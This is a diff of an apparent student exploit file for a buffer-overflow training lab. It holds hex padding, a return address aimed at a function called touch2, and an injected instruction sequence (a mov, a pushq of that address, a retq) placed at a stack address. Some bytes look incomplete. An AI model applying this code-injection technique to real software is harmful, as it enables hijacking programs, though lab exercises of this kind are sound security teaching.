@@ -8,13 +8,11 @@
 41 41 41 41 41 41 41 41
 
 /* Return to touch2 */
-f0 17 40 00 00 00 00 00
+/* f0 17 40 00 00 00 00 00 */
 
-/* /* Code Injection */
-/* 7f ff ff fe d3 68 so go to next entry (+8) */
-70 d3 fe ff ff 7f
-		  00 00
-ff 34 25 f0 17 40 00 	/* pushq  0x4017f0 # address of touch2 */
-		     00
-c3			/* retq # return to touch2 */
-   00 00 00 00 00 00 00 */
+/* Code Injection */
+/* rsp at 0x55619db0 so go to next entry (+8) */
+b8 9d 61 55 00 00 00 00		   
+ff 34 25 f0 17 40
+
+/* c3 */
